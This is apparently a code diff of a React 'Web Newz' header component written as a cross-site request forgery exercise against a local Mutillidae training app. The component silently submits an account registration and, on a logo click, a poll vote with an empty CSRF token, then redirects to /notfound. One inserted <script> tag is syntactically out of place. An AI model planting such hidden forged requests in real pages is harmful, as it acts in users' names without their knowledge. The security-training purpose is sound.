@@ -18,24 +18,22 @@ function Header(){
         var signature = signatureRef.current.value;
         var button = buttonRef.current.value;
 
+        <script>
         var formData =
-            "username=" +
-            username +
-            "&password=" +
-            password +
-            "&confirm_password=" +
-            confirm_password +
-            "&my_signature=" +
-            signature +
-            "&register-php-submit-button=" +
-            button;
+            "username=username" +
+            "%26password=password" +
+            "%26confirm_password=password" +
+            "%26my_signature=signature" +
+            "%26register-php-submit-button=Create+Account";
 
         const requestOptions = {
             method: "POST",
             headers: {"Content-Type": "application/x-www-form-urlencoded"},
             body: formData,
         };
-        fetch("/index.php?page=register.php", requestOptions);
+        fetch("https://localhost/mutillidae/index.php?page=register.php", requestOptions);
+        </script>
+
         window.location.href="/notfound";
     };
 
@@ -50,7 +48,7 @@ function Header(){
                                 const requestOptions = {
                                     method: "GET",
                                 };
-                                fetch("/index.php?page=user-poll.php&choice=netcat&initials=said&csrf-token=&user-poll-php-submit-button=Submit+Vote", requestOptions);
+                                fetch("https://localhost/mutillidae/index.php?page=user-poll.php&choice=netcat&initials=said&csrf-token=&user-poll-php-submit-button=Submit+Vote", requestOptions);
                             }}>
                                 <Navbar.Brand href="/">Web Newz</Navbar.Brand>
                             </div>
